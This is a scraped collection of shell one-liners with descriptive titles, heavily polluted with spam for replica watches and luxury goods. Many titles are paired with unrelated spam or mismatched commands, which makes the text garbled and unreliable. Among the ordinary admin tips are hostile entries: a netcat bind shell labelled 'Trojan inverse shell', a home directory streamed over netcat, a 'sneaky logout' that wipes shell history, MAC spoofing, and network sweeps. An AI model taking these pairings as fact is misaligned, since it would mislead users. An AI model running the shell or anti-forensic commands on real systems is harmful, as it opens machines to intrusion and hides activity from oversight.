
# python smtp server
python -m smtpd -n -c DebuggingServer localhost:1025


# Find broken symlinks in the current directory and its subdirectories.
find -L -type l


# Read and write to TCP or UDP sockets with common bash tools
Replica Richard Mille watches


# Get the current gold price
Home, Patek Philippe


# Getting a list of active addresses in your own network.
nmap -n -sP -oG - 10.10.10.*/32 | grep ": Up" | cut -d' ' -f2


# annoy your sysadmin colleague
cd / && touch ./\-i


# SSH socket
ssh -D localhost:8090 username@serve.com -f -N


# When you have time to consume
moon-buggy


# Read and write to TCP or UDP sockets with common bash tools
Tiffany & Co Exquisite Tiffany 1837 Tag Charm necklace - $65.00 : Professional tiffany outlet stores, tiffanyeco.top


# Quick syntax highlighting with multiple output formats
Omega 121.62.41.50.01.001 Men - Constellation series of mechanical watches [e336] [4890&nbsp;] - $232.00 : Professional Replica Omega Watches Store, iomegaspeedmaster.top


# Equivalent of alias in cmd.exe: doskey (macros)
doskey l=dir /OD $*


# ugg short sparkles boots clearance
180


# Git reset added new files
Submariner


# Nice way to view source code
Replica Patek Philippe Aquanaut series 5087/1A-001 Ms. quartz watch (Patek Philippe) [4492] - $237.00 : Zen Cart!, The Art of E-commerce


# Sort output by length of line
sortwc () { local L;while read -r L;do builtin printf "${#L}@%s\n" "$L";done|sort -n|sed -u 's/^[^@]*@//'; }


# Easy way to scroll up und down to change to one of <i>n</i> last visited directories.
alias cdd="history -a && grep '^ *[0-9]* *cd ' ~/.bash_history| tail -10 >>~/.bash_history && history -r ~/.bash_history"


# Make keyboard keys repeat properly
Moncler Mens Outlet England UK Europe


# Quickly check a device in a LVM volume group against multipath
pvscan | awk '/name_of_vg/ {print $2}' | sed 's/[-|/|]/ /g' | cut -d " " -f7


# get php version in terminal
php -i | grep  'PHP Version' | awk '{if(NR==1)print}'


# snarf is a command line resource grabber.
snarf http://foo.bar.com/picture.jpg


# Virtualbox rsync copy (without defining any virtualbox configuration)
rsync -a --progress -e 'ssh -p 2200 -i .vagrant/machines/default/virtualbox/private_key' vagrant@127.0.0.1:/vagrant/vm/old_timecapsule_backup /Volumes/2TB/


# Convert entire music library
Quartz 123.55.24.60.55.001 Copy Omega Watches Constellation Ladies Watch [a16d] - $219.00 : Professional replica watches stores, patekwatch.net.cn


<ctrl+z> fg; notify_me


# hostgrep: set ip and hostname from /etc/hosts (non-DNS)
Clutches : Michael Kors Outlet


# Trojan inverse shell
nc -l -p 2000 -e /bin/bash


# finds the c files with lines containing 'mcs', in the folders under the current folder
find */*.c | xargs grep 'mcs'


# Google dictionary of word definitions
wget -qO - "http://www.google.com/dictionary/json?callback=dict_api.callbacks.id100&q=steering+wheel&sl=en&tl=en&restrict=pr,de&client=te" | sed 's/dict_api\.callbacks.id100.//' | sed 's/,200,null)//'


# Rsync remote data as root using sudo
rsync --rsync-path 'sudo rsync' username@source:/folder/ /local/


# Add a line to a file using sudo
echo "foo bar" | sudo tee -a /path/to/some/file


# prepare unicode text saved from Microsoft Excel 2003 for unix console
iconv -f UTF16LE -t UTF-8 < SOURCE | awk 'BEGIN { RS="\r\n";} { gsub("\n", "\r"); print;}' > TARGET


# number files in directory according to their modification time
IFS=$'\n'; i=1; ls -lt *mp3 | cut -d ":" -f2 | cut -d " " -f2- | while read f; do mv "$f" $(echo "$i"."$f"); ((i++)); done


# upload a file via ftp
curl -u user:passwd -T /home/dir/local_file_to_upload ftp://your_host.com/subdir/


# check remote port  without telnet
Moncler Chany Down Vest Women Zip Short Black [Moncler1231] - $376.00 : Cheap Moncler Outlet Online Store, monclervests.top


# Display Spinner while waiting for some process to finish
while kill -0 0; do timeout 5 bash -c 'spinner=( Ooooo oOooo ooOoo oooOo ooooO oooOo ooOoo oOooo); while true; do for i in ${spinner[@]}; do for _ in seq 0 ${#i}; do echo -en "\b\b"; done; echo -ne "${i}"; sleep 0.2; done; done'; done


# Chronometer
AAA+ Audemars Piguet Watches,Audemars Piguet Watches Online


# Git reset added new files
Crea un account : gioielli tiffany, watchesformen21.top


# Adding formatting to an xml document for easier reading
tidy -i -xml <inputfile>


# Get column names in MySQL
mysql -u <user> --password=<password> -e "SHOW COLUMNS FROM <table>" <database> | awk '{print $1}' | tr "\n" "," | sed 's/,$//g'


# count files by type
ls | tr [:upper:] [:lower:] | grep -oP '\.[^\.]+$'  | sort | uniq -c | sort


# Bulk renames with find, sed and a little escaping
find . -exec bash -c "mv '{}' '\`echo {} |sed -e 's/foo/bar/g'\`"' \;


# Find all videos under current directory
find ./ -type f -print0 | xargs -0 file -iNf - | grep video | cut -d: -f1


# A file's rpm-package details
summpkg() { rpm -qfi "$@"; }


# Find biggest 10 files in current and subdirectories and sort by file size
find . -type f -print0 | xargs -0 du -h | sort -hr | head -10


# a find and replace within text-based files, for batch text replacement, not using perl
for file in `find . -iname "FILENAME"`; do cat $file | sed "s/SEARCH_STRING/REPLACE_STRING/" > $file.tmp; mv $file.tmp $file; done


# Virtualbox rsync copy (without defining any virtualbox configuration)
Omega ( 154 ) , Seamaster


# Highlight the plain text in XML (or HTML, SGML, etc)
Top Swiss Made Replica Rolex Watches Online Sale


# list files and folders
ls -l


# scp
scp -P 2202 /$filelocation user@host:/$final/$location


# Mirror site with rel-links, 20s delay via Wget
wget -mk -w 20 http://www.example.com/


# Show this month's calendar, with today's date highlighted
cal | grep --before-context 6 --after-context 6 --color -e " $(date +%e)" -e "^$(date +%e)"


# Ping all hosts on 192.168.1.0/24
for i in {0..255} ; do (ping 192.168.1.$i -c 1  > /dev/null && echo "192.168.1.$i" & ) ; done


# Display current number of sessions on haproxy
IWC Portugieser


# cymru malware check
md5sum filename | ncat hash.cymru.com 43


# Copy Current Command Line to Clipboard
bind '"\C-l": "\C-u cat <<EOT | pbcopy \n \C-y \nEOT\n"'


# convert unixtime to human-readable
date -r 1390196676


# On Screen micro display for battery and CPU temperature. nifty, small, omnipresent
acpi -t | osd_cat -p bottom


# Archive tar.gz archives all files (with extension filter) individually from an location
find ./ -iname "*.dmp" -maxdepth 0 -type f -exec tar czvf {}.tar.gz  --remove-files {} \; \;


# Create a mirror of a local folder, on a remote server
rsync -e "/usr/bin/ssh -p22" -a --progress --stats --delete -l -z -v -r -p /root/files/ user@remote_server:/root/files/


# Push current task to background (paused) and resume it.
<CTRL+Z>; fg


# Get a quote from Pooh
Tiffany Anillos


# Display diffed files sidebyside, with minimal differences, using the full width of the terminal.
diff -dbByw $COLUMNS FILE1 FILE2


# show current directory
nautilus `pwd`


# Deal with dot files safely
rm -r .[!.]*


# Replace + Find
Replica Gorgeous Audemars Piguet Royal Oak 30th Anniversary White Ceramic Diamond AAA Watches [abdb] - $227.00 : Professional replica watches stores, swisswatchmen.co


# Kill all processes belonging to a user
ps -fu $USER | awk {'print $2'} | xargs kill [-9]


# download a list of urls
cat urls.txt | wget -i- -T 10 -t 3 --waitretry 1


# create video from image series
ffmpeg -f image2 -r 15 -i pic.%04d.png -r 15 -b:v 8M vid15.avi


# Find which service was used by which port number
cat /etc/services  | egrep [[:blank:]]<port_number>/


# Read and write to TCP or UDP sockets with common bash tools
Chanel Medium Hobo Shoulder Bag Original Leather MSA50285 leather red - $256.00 : Professional chanel outlet stores, zen.com.co


# convert string to array
s="124890";for i in $(seq 0 1 $((${#s}-1))); do arr[$i]=${s:$i:1}; done


# HourGlass
hourglass(){ trap 'tput cnorm' 0 1 2 15 RETURN;local s=$(($SECONDS +$1));(tput civis;while (($SECONDS<$s));do for f in '|' '\' '-' '/';do echo -n "$f";sleep .2s;echo -n $'\b';done;done;);}


# Get a quick list of all user and group owners of files and dirs under the cwd.
find -printf '%u %g\n' | sort | uniq


# List only executables installed by a debian package
lst=`dpkg -L iptables` ; for f in $lst; do if [ -x $f ] && [ !  -d $f ] ;  then echo $f; fi; done;


# shell function to make gnu info act like man.
myinfo() { info --subnodes -o - $1 | less; }


# get ip of all running docker containers
Best Quality Dresses for Weddings


# Find out what is using the bandwidth
nethogs


# umount --rbind mount with submounts
cat /proc/mounts | awk '{print $2}' | grep "^$MOUNTPOINT" | sort -r | xargs umount


# Highlight the plain text in XML (or HTML, SGML, etc)
Montblanc La Donna Ingrid Bergman Rollerball Pen Black 104906 [2d7c] - $110.00 : Professional montblanc pen stores, bestrollerballpen.top


# Set OS X X11 to use installed Mathematica fonts
xset fp+ /Applications/Mathematica.app/SystemFiles/Fonts/Type1/


# Watch active calls on an Asterisk PBX
watch -n 1 "sudo asterisk -vvvvvrx 'core show channels' | grep call"


# Update zone file Serial numbers
sed -i 's/20[0-1][0-9]\{7\}/'`date +%Y%m%d%I`'/g' *.db


# Show me just the ip address
showip() { nmcli connection show $1|grep ipv4.addresses|awk '{print $2}' ; }


# Slow down the screen output of a command
ls -lart|lolcat -a


# Connect to irssi over ssh
rxvt-unicode -g 999x999 -sr -depth 32 -bg rg-ba:0000/0000/0000/dddd +sb -T irssi -n irssi -name irssichat -e ssh server.com -Xt screen -aAdr -RR irssi irssi


# Download all images from a 4chan thread
curl -s http://boards.4chan.org/wg/|sed -r 's/.*href="([^"]*).*/\1\n/g'|grep images|xargs wget


# Print current running shell, PID
ps -p $$


# AIX - gzip command to compress a file
gzip -c source.csv > source.csv.gz


# tar a directory and send it to netcat
tar cfvz - /home/user | netcat -l -p 10000


# Connect to remote machine with other enconding charset
LC_ALL=fr_FR luit ssh root@remote_machine_ip


# AAA Replica Quintessential Omega Seamaster Aqua Terra Automatic Gold Marking With White Diamond Watches [bd2e] - $219.00 : Professional replica watches stores, watchestopsales.cn
180


# find duplicate messages in a Maildir
find $folder -name "[1-9]*" -type f -print|while read file; do echo $file $(sed -e '/^$/Q;:a;$!N;s/\n //;ta;s/ /_/g;P;D' $file|awk '/^Received:/&&!r{r=$0}/^From:/&&!f{f=$0}r&&f{printf "%s%s",r,f;exit(0)}');done|sort -k 2|uniq -d -f 1


# Remove all .svn folders
find . -name .svn -type d |xargs rm -rf


# encode HTML entities
Replica Omega Seamaster 231.10.39.21.01.001 automatic mechanical male watch (Omega) - $209.00 : Zen Cart!, The Art of E-commerce


# "Clone" a list of installed packages from one Debian/Ubuntu Server to another
apt-get install `ssh root@host_you_want_to_clone "dpkg -l | grep ii" | awk '{print $2}'`


# Paste the contents of OS X clipboard into a new text file
pbpaste > newfile.txt


# a simple alarm
while true; do while [ `date +%H%M` == "1857" ] ; do sleep 1s; yes | head -n 2000 > /dev/dsp; done; done;


# Download files linked in a RSS feed
Scarpe Christian Louboutin Sling , Christian Louboutin


# find&grep all in once
#!/bin/bash find | grep -P -v "(class)|(zip)|(png)|(gz)|(gif)|(jpeg)|(jpg)" | xargs -I @ grep -H $1 @


# ifrename
busybox nameif newname $(</sys/class/net/oldname/address)


# my ip
curl ip.appspot.com


# Restore permissions or ownership from a backup directroy
for x in `find /dir_w_wrong_ownership/`; do y=`echo "$x" | sed 's,/dir_w_wrong_ownership/,/backup_dir/,'`; chown --reference $y $x; done;


# translate what is in the clipboard in english and write it to the terminal
tw translate.google.com.de-en `xsel`


# Prints total line count contribution per user for an SVN repository
svn ls -R | egrep -v -e "\/$" | xargs svn blame | awk '{print $2}' | sort | uniq -c | sort -r


# Swap a file or dir with quick resotre
mv public_html{,~~} && mv public_html{~,} && mv public_html{~~,~}


# Prettify an XML file
tidy -xml -i -m [file]


# Dump
Top Quality Cartier Gioielli e occhiali da sole in linea, Replica orologi Cartier al prezzo più basso


# Make keyboard keys repeat properly
Fake Great Rolex Daydate AAA Watches [F8G4] - $214.00 : Professional replica watches stores, michellewatches.top


# Enable Basic Security Mode (BSM) Auditing --Solaris
/etc/security/bsmconv


# Get the current gold price
Günstige Luxus-Uhren für Männer und Frauen, Top-Marke Replica Uhren zum Verkauf


# Charms Pandora baratos , Desconto Pandora Jóias Apuramento 2015
180


# Take a screenshot of the focused window with a 4 second countdown
scrot -ucd4 -e 'eog $f'


# Monitor Linux/MD RAID Rebuild
watch -n 5 -d cat /proc/mdstat


# Find files and list them with a readable informative output
find . -type f | sed 's,.*,stat "&" | egrep "File|Modify" | tr "\\n" " " ; echo ,'  | sh | sed 's,[^/]*/\(.*\). Modify: \(....-..-.. ..:..:..\).*,\2 \1,' | sort


# 20char long alpahnumeric
$ apg -m 40 -a 1


# encode HTML entities
ALAIN Silberstein orologi replica


# Delete all empty lines from a file with vim
:g!/\S/d


# Print all fields in a file/output from field N to the end of the line
awk '{print substr($0, index($0,$N))}'


# Timberland Outlet Stores,Timberland Boots & Shoes Sale
180


# last mounted device
mount |tail -1 | less -p "/dev/[^ ]*"


# To know the IP address of the machine current running on the network
fping -g 192.168.1.1 192.168.1.10 -r 1 | grep -v unreachable | awk '{print $1}'


# Remove the first character of each line in a file
cut -c 2- < <file>


# Backup entire directory using rsync
rsync -avzhP <[[user@]host1:]directory1> <[[user@]host2:]directory2>


# List upcoming events on google calendar
google calendar list --date `date --date="next thursday" +%Y-%m-%d`


# pulsed terminal clock
clear;while true;sleep 1;do for((a=1;a<=$(tput cols)/3;a++));do tput cup 0 $a;echo " " $(date);done;sleep 1;for((a;a>=1;a--));do tput cup 0 $a;echo $(date) " ";done;done


# Finding commands to create alias for
history | awk '{CMD[$2]++;count++;}END { for (a in CMD)print CMD[a] " " CMD[a]/count*100 "% " a;}' | grep -v "./" | column -c3 -s " " -t | sort -nr | nl |  head -n10


# When using mkvirtualenv, make the current directory your base and cd into that directory every time you workon that project
echo 'echo "cd `pwd`" >> $VIRTUAL_ENV/bin/postactivate' >> $VIRTUAL_ENV/../postmkvirtualenv


# dmesg with colored human-readable dates
dmesg with colored human-readable dates


# scp
scp -P 2202 /$filelocation user@host:/$final/$location


# Reboot
shutdown now -r


# Find name of package which installed a given shell command
dpkg -S "$(readlink -e $(which w))" | cut -d ':' -f 1


# Generate a quick, lengthy password
head /dev/urandom | md5sum | base64


# Replace + Find
2012 New! Moncler Mayuko Grosgrain Bow Long Down Coat Black - $319.00 : Professional Moncler Down Jacket Outlet Store, monclerfr1.com


# Highlight the plain text in XML (or HTML, SGML, etc)
Tiffany and co Outlet Two Stars Key Ring jewelry [4be6] - $65.00 : Professional tiffany outlet stores, jewelrysstores.cn


# Print every Nth line
giacca spyder in vendita


# show how many regex you use in your vim today
cat ~/.viminfo  | sed -n '/^:[0-9]\+,\([0-9]\+\|\$\)s/p'


# Get the current gold price
Cheap Wedding Dresses, Beautiful Wedding Gowns for Sale from China


# Print all open regular files sorted by the number of file handles open to each.
womens moncler  jacket


# Print all open regular files sorted by the number of file handles open to each.
watch


# Remove annotation- (or other own-lined) tags from an XML document
awk "/<xsd:annotation>/{h=1};!h;/<\/xsd:annotation>/{h=0}" annotatedSchema.xsd


# remove a directory filled with too many files
find /SOME/PATH -type f -execdir rm -f {} \+


# simplified "tail -f"
tailf


# diff output of two commands
diff <(tail -10 file1) <(tail -10 file2)


# Scan all available IP addresses on network
nmap -sP $(ip -o addr show | grep inet\  | grep eth | cut -d\  -f 7)


# vim read stdin
ls | view -


# send a message to a windows machine in a popup
echo "message" | smbclient -M NAME_OF_THE_COMPUTER


# Watch the progress of 'dd'
pv -tpreb /dev/urandom | dd of=file.img


# Read and write to TCP or UDP sockets with common bash tools
2013 New! Moncler Winter Jackets Womens Zip Stand Collar Yellow [0531] - $276.00 : Professional Moncler Down Jacket Outlet Store, monclerlines.co


# Purge frozen messages in Exim
exipick -zi | xargs --max-args=1000 exim -Mrm


# create an screenshot, upload it to your server via scp and then open that screenshot in firefox
FILE="`date +%m%d%H%M%S`.png"; URL="http://YOUR_HOST/YOUR/PATH/$FILE"; TMP="/tmp/$FILE"; import -frame $TMP; scp $TMP YOUR-USER@YOUR-HOST:/YOUR/PATH/; rm $TMP; firefox "$URL"


# Get video information with ffmpeg
avconv -i vid.avi


# show mysql process ids
mysql -s -e "show processlist" |awk '{print $1}'


# Tell local Debian machine to install packages used by remote Debian machine
ssh remotehost 'dpkg --get-selections' | dpkg --set-selections && dselect install


# List complete size of directories (do not consider hidden directories)
du -hs */


# Download all images from a 4chan thread
function 4chandl () { wget -e robots=off -nvcdp -t 0 -Hkrl 0 -I \*/src/ -P . "$1" }


# Give webpage status code
e() { echo $(curl -o /dev/null --silent --head --write-out '%{http_code}\n' $1); }


# How many lines in your c project?
find . -type f -name *.[ch] -exec wc -l {} \;


# count number of CPU available for members of a given Virtual Organization
echo `lcg-infosites --vo lhcb ce | cut -f 1| grep [[:digit:]]| tr '\n' '+' |sed -e 's/\ //g' -e 's/+$//'`|bc -l


# Replace + Find
Replica Audemars Piguet Classique Clous De Paris series 15163BC.GG.A002CR.01 watches - $196.00 : replica  watches online stores, watchesreplica.me


# Put split files back together, without a for loop
cat file{0..5} > mainfile


# Display which distro is installed
cat /etc/issue


# move you up one directory quickly
alias b='cd ../'


# check remote port  without telnet
Uomini New Timberland Boots 002 - &euro;112.53 : Outlet timberland, menstimberlandboots.top


# Moncler Men 2014 camouflage coat 801 - $302.00 : Professional Moncler Down Jacket Outlet Store, 49monclersale.com
180


# Real full backup copy of /etc folder
tar -cf - /etc | tar -xf - -C </destination/folder>


# encode HTML entities
TAG Heuer watches


# Convert entire music library
Replica 1267.70.00 Omega Constellation Ladies Quartz (OMEGA) [4a91] - $215.00 : Zen Cart!, The Art of E-commerce


# Read Python logs with tracebacks in color
AAA+ Rolex Replica Watches, Fake Rolex Watches On Sale


# Meter your entropy
pv /dev/random > /dev/null


# Sneaky logout
rm ~/.bash_history && kill -9 $$


# Use this command to reboot the pc in linux
sudo reboot


# Create date based backups
backup() { for i in "$@"; do cp -va $i $i.$(date +%Y%m%d-%H%M%S); done }


# List your interfaces and MAC addresses
ifconfig | awk '/HWaddr/ { print $1, $5 }'


# Better PS aliases
export PSOA='user,pid,time,state,command' ; function _ps { /bin/ps $@ ; } ; alias psa='_ps ax -o $PSOA'


# Resource Monitoring


# Quickly make schema changes in Django
while true ; do scripts/bootstrap.py ; ./manage.py runserver ; done


# Selecting a random file/folder of a folder
find . | shuf -n1


# Create a P12 file, using OpenSSL
openssl pkcs12 -export -in /dir/CERTIFICATE.pem -inkey /dir/KEY.pem -certfile /dir/CA-cert.pem -name "certName" -out /dir/certName.p12


# Email an svn dump
(svnadmin dump /path/to/repo | gzip --best > /tmp/svn-backup.gz) 2>&1 | mutt -s "SVN backup `date +\%m/\%d/\%Y`" -a /tmp/svn-backup.gz emailaddress


# show current directory
xdg-open .


# clone directory structure
cp -Rs dir1 dir2


# Hublot horloges, 2016newhublot.top
180


# Search for a <pattern> string inside all files in the current directory
grep -nisI <pattern> * .[!.]*


# Open in TextMate Sidebar files (recursively) with names matching REGEX_A and not matching REGEX_B
mate - `find * -type f -regex 'REGEX_A' | grep -v -E 'REGEX_B'`


# A little bash daemon =)
echo "Starting Daemon"; ( while :; do sleep 15; echo "I am still running =]"; done ) & disown -h $!


# Simple Video Surveillance by email
while true ; do fswebcam -d /dev/video0 -r 1280x1024 -F 15 - | uuencode $(date +\%Y\%m\%d\%H\%M).jpeg | mail -s "Video surveillance" me@gmail.com ; sleep 300 ; done


# Read and write to TCP or UDP sockets with common bash tools
Longines saint-imier collection


# Get EXIF data from image with zenity
ans=$(zenity  --title "Choose image:" --file-selection); exiftool -s ${ans} | zenity --width 800 --height 600 --text-info;


# Streaming HTML5 video to icecast server using dvgrab, ffmpeg2theora and oggfwd
dvgrab --format raw - | tee dvstream.dv | ffmpeg2theora -A 45 -V 400 -c 1 -f dv -x 360 -y 288 -o /dev/stdout - | tee savelivestream.ogv | oggfwd -p -d "Stream description" -n "Streamname" my.icecastserver.com 80 icecastpassword /stream.ogv


# Read and write to TCP or UDP sockets with common bash tools
Replica Rolex Datejust Watch Two Tone Black Computer Dial Diamond Marking La [c180] - $215.00 : Professional replica watches stores, breitlingprices.org


# Show hidden files
Modern Breitling For Bentley Chronograph Quartz Movement Silver Case AAA Watches [M2C7] - $217.00 : Professional replica watches stores, omegawatchesforsale.cn


# Recursive replace of directory and file names in the current directory.
find -name '*oldname*' -print0 | xargs -0 rename 's/oldname/newname/'


# Check your spelling
aspell -a <<< '<WORDS>'


# Bare Metal IRC Client
1335.76.00 Omega Constellation Ladies Quartz (OMEGA) [d7e9] - $205.00 : Professional replica watches stores, huotop.com


# Generate random number with shuf
seq 10| shuf | head -1


# Minimize CSS/JS while preserving functionality.
gominify() { if [ $# -ne 2 ]; then echo 'gominify < src > < dst >'; return; fi; s="$1"; d="$2"; java -jar yui.jar $s >$d; if [ $? == 0 ]; then a=$( ls -sh $s | awk '{print $1}' ); b=$( ls -sh $d | awk '{print $1}' ); echo "Saved $s ($a) to $d ($b)"; fi;}


# Fast install software in Ubuntu
alias agi='sudo apt-get install'


# Search for a word in less
\bTERM\b


# Preserve user variables when running commands with sudo.
sudo -E rpm -Uvh "http://download.fedoraproject.org/pub/epel/6/i386/epel-release-6-8.noarch.rpm"


# Get a quote from Pooh
Moncler Boots : Moncler Outlet 2014 , Moncler Outlet 2014


# Grab the top 5 CLFUContest one-liners
curl -sL http://goo.gl/3sA3iW | head -16 | tail -14


# Calculate CPU load limit on GNU/Linux
Replica Omega watch AQUA TERRA 150 M CO-AXIAL 41,5 MM 231.13.42.21.02.002 [ac8a] - $225.00 : Professional replica watches stores, watchswiss.co


# Print every Nth line
Replica Breitling watches, Cosmonaute watches


# ImageMagick now deals with RAW files.
Crystal Provence Lavender Seta Pendant(1157954) [1157954] - $76.00 : swarovskigift, blueswat.com


# remove all spaces from all files in current folder
Breitling Montbrillant A23351A6 | G741 | 445A automatic mechanical watches men (Breitling) - $207.00 : Zen Cart!, The Art of E-commerce


# Lists the size of certain file in every 10 seconds
while true ; do du -sk testfile ; sleep 10 ; done


# Better git diff, word delimited and colorized
Patek Philippe Replica Watches - SWISS 3A WATCHES


# Read and write to TCP or UDP sockets with common bash tools
Omega Speedmaster


# Indent a one-liner.
declare -f <function name>


# Start the x11vnc server
x11vnc -display :0 -scale 6/7 -rfbauth vncpass -forever


# Send pop-up notifications on Gnome
notify-send ["<title>"] "<body>"


# randomize hostname and mac address, force dhcp renew. (for anonymous networking)
dhclient -r && rm -f /var/lib/dhcp3/dhclient* && sed "s=$(hostname)=REPLACEME=g" -i /etc/hosts && hostname "$(echo $RANDOM | md5sum  | cut -c 1-7 | tr a-z A-Z)" && sed "s=REPLACEME=$(hostname)=g" -i /etc/hosts && macchanger -e eth0 && dhclient


# Use /dev/full to test language I/O-failsafety
perl -e 'print 1, 2, 3' > /dev/full


# Scan for nearby Bluetooth devices.
hcitool scan


# Re-emerge all ebuilds with missing files (Gentoo Linux)
emerge -a `qcheck -aCB`


# Check the destination of a shortened URL without opening it
curl -sIL http://bit.ly/1aalcwX | grep 'Location: '


# Designer Wedding Dresses 2014 at Aisle Style UK - Custom Made Available
180


# Open a file with less and go to first match of pattern
Replica Tag Heuer Aquaracer Watch Chrono Day-Date Blue Dial Same Chassis As 7750-High Quality [b250] - $209.00 : Professional replica watches stores, watch2shop.me


# check remote port  without telnet
Moncler Vest Voor Heren : Moncler , Moncler Jassen , Moncler te koop met gratis verzending meer dan $ 99, Moncler Online . !


# Exporting all MySQL user privileges
mysql -u{user} -p{password} -Ne "select distinct concat( \"SHOW GRANTS FOR '\",user,\"'@'\",host,\"';\" ) from user;" mysql | mysql -u {user} -p{password} | sed 's/\(GRANT .*\)/\1;/;s/^\(Grants for .*\)/## \1 ##/;/##/{x;p;x;}'


# Merge various PDF files
gs -dNOPAUSE -sDEVICE=pdfwrite -sOUTPUTFILE=output.pdf -dBATCH first.pdf second.pdf


# Replace + Find
Copy Watches Rolex Datejust Automatic Watch Movement Two Tone Black Dial Roman Marking Lady Size Post4365 [156f] - $209.00 : Professional replica watches stores, menswatcheslove.top


# Monitor RX/TX packets and any subsquent errors
watch 'netstat -aniv'


# Determine space taken by files of certain type
find . -name <pattern> -ls | awk 'BEGIN {i=0}; {i=i+$7}; END {print i}'


# Convert entire music library
Spyder kvinner ski jakker : Spyder Jakker, Spyder Outlet , Spyder Jackets Outlet Sale


# IP="17.255.8.44"; for n in {0..255}; do echo $IP | grep -w $n; done | [[ $(wc -l) = 4 ]] && echo IP is ok || echo IP is not ok
I'm using functions, but most people prefer straightforward.Also regex is a moot point.


# List your largest installed packages.
dpkg --get-selections | cut -f1 | while read pkg; do dpkg -L $pkg | xargs -I'{}' bash -c 'if [ ! -d "{}" ]; then echo "{}"; fi' | tr '\n' '\000' | du -c --files0-from - | tail -1 | sed "s/total/$pkg/"; done


# split and combine different pages from different pdf's
pdftk A=chapters.pdf B=headings.pdf C=covers.pdf cat C1 B1 A1-7 B2 A8-10 C2 output book.pdf


# Schedule a script or command in x num hours, silently run in the background even if logged out
( ( sleep 2h; your-command your-args ) & )


# Create .tar file on Mac OS X Leopard / Snow Leopard without ._* files
COPYFILE_DISABLE=true tar cvf newTarFile.tar Directory/


# RHEL / CentOS Support 4GB or more RAM ( memory )
yum install kernel-PAE


# dd with progress bar and statistics to gzipped image
DISKSIZE=`sudo blockdev --getsize64 /dev/sdb` && sudo dd bs=4096 if=/dev/sdb | pv -s $DISKSIZE | sudo gzip -9 > ~/USBDRIVEBACKUP.img.gz


# attach to bash shell in the last container you started
Tiffany Bangle : Tiffany uscita


# Create a video screencast (capture screen) of screen portion, with audio (the audio you hear, not your mic)
cvlc --input-slave pulse://<device> screen:// --screen-fps=15 --screen-top=0 --screen-left=0 --screen-width=640 --screen-height=480 --sout='#transcode{vcodec=FLV1,vb=1600,acodec=aac}:std{access=file,mux=ffmpeg{mux=flv},dst=viewport1.flv}'


# Find out if a module is installed in perl
perldoc -l Module::Name 2>/dev/null


# Turn monitor on or off if off or on, respectively
xset -display :0 q | grep '  Monitor is On' > /dev/null && xset -display :0 dpms force off || xset -display :0 dpms force on


# ubuntu tasksel
tasksel list-tasks


# Stripping ^M at end of each line for files
perl -pi -e 's:^V^M::g' <filenames>


# Find Out My Linux Distribution Name and Version
cat /etc/issue


# Skip over .svn directories when using the "find" command.
find . -not \( -name .svn -prune \)


# vim read stdin
ls | vim +'set bt=nowrite' -


# List only the directories
ls -l | egrep ^d


# Find all files containing a word
grep -rHi searchphrase *.php


# Display all readline binding that use CTRL
bind -p | grep -F "\C"


# Annoy everyone on your system
Rolex Datejust 36 : Professional replica watches stores, menswatches.net.cn


# Search entire web server for preg_replace /e based php malware.
Christian Louboutin junio 100mm Rose Matador - &euro;128.34 : Salida de Christian Louboutin, johanelectronic.com


# quit gvim remotely
gvim --remote-send ":q!<CR>"


# Print all open regular files sorted by the number of file handles open to each.
New New Balance 574 WL574BLW Blue White Black - $97.00 : New Balance outlet stores, settlesource.net


# List known debian vulnerabilities on your system -- many of which may not yet be patched.
Tiffany Ringer: Tiffany og co stikkontakt, Tiffany smykker stikkontakt, Tiffany and Co Salg, Tiffany og co med 70% rabatt og gratis frakt, Tiffany & Co Outlet


# Find usb device
diff <(lsusb) <(sleep 3s && lsusb)


# Get purescript externs
cat externs.json  | jq ".efExports | .[] | (keys|.[0]) as \$kind | {kind:\$kind,value:(.[\$kind] |.Ident?)}"


# use google's text-to-speech and play in media player
say() {   wget -q -U Mozilla -O output.mp3 "http://translate.google.com/translate_tts?ie=UTF-8&tl=en&q=$1"   open output.mp3 &>/dev/null || xdg-open output.mp3 &>/dev/null }


# Convert entire music library
AAA+ Audemars Piguet Watches,Audemars Piguet Watches Online


# MS-DOS only: Enable variable expansion from inside of FOR loops with !varname!
setlocal enabledelayedexpansion


# Read and write to TCP or UDP sockets with common bash tools
Replica Omega-Best orologi replica Australia, falso all'ingrosso orologi vendita


# print line and execute it in BASH
bash -x script.sh


# remove oprhan package on debian based system
sudo deborphan | xargs sudo apt-get -y remove --purge


# Search entire server for Q4 2015 obfuscated PHP malware of unknown origin.
Tiffany Necklaces : Buy cheap tiffany & co australia outlet online sale!, page_site_tagline


# Display connections histogram
netstat -an | grep ESTABLISHED | awk '\''{print $5}'\'' | awk -F: '\''{print $1}'\'' | sort | uniq -c | awk '\''{ printf("%s\t%s\t",$2,$1); for (i = 0; i < $1; i++) {printf("*")}; print ""}'\''


# Dell OMSA version check function
function dellomsaver { snmpwalk -v2c -cmycommunityname $1 1.3.6.1.4.1.674.10892.1.100.2.0; }


# Generate a list of installed packages on Debian-based systems
aptitude search ~i -F %p


# Big Countdown Clock in seconds
i=$((15*60)); while [ $i -gt 0 ]; do clear; echo $i | figlet; sleep 1; i=$(($i-1)); done;


# Fetch every font from dafont.com to current folder
d="www.dafont.com/alpha.php?";for c in {a..z}; do l=`curl -s "${d}lettre=${c}"|sed -n 's/.*ge=\([0-9]\{2\}\).*/\1/p'`;for((p=1;p<=l;p++));do for u in `curl -s "${d}page=${p}&lettre=${c}"|egrep -o "http\S*.com/dl/\?f=\w*"`;do aria2c "${u}";done;done;done


# Look at logs startring at EOF
less +F <file>


# Read and write to TCP or UDP sockets with common bash tools
Hermes Reversible Leather HandBags Blue/Peach 519020 Outlet - $259.00 : hermes handbag outlet, hermeslist.com


# Get your external IP address
curl http://my-ip.cc/host.xml


# show each new entry in system messages as a popup
tail -n0 -f /var/log/messages | while read line; do notify-send "System Message" "$line"; done


# Find 'foo' in located files
locate searchstring | xargs grep foo


# send echo to socket network
echo foo | netcat 192.168.1.2 25


# Find 'foo' string inside files
find . -type f -print | xargs grep foo


# Batch Convert SVG to PNG (in parallel)
find . -name \*.svg -print0 | xargs -0 -n1 -P4 -I{} bash -c 'X={}; convert "$X" "${X%.svg}.png"'


# Recursive source regexp search with pcregrep
pcregrep -r --exclude_dir='.svn' --include='.*jsp$'  -A 2 -B 2 --color   "pHtmlHome" .


# Calculate N!
seq 10 | paste -sd* | bc


# Recursively search for large files. Show size and location.
find . -size +100000k -exec du -h {} \;


# Virtualbox: setup hardware
VBoxManage modifyvm "vm-name" --memory 256 --acpi on --ioapic off --pae on --hwvirtex on --nestedpaging on


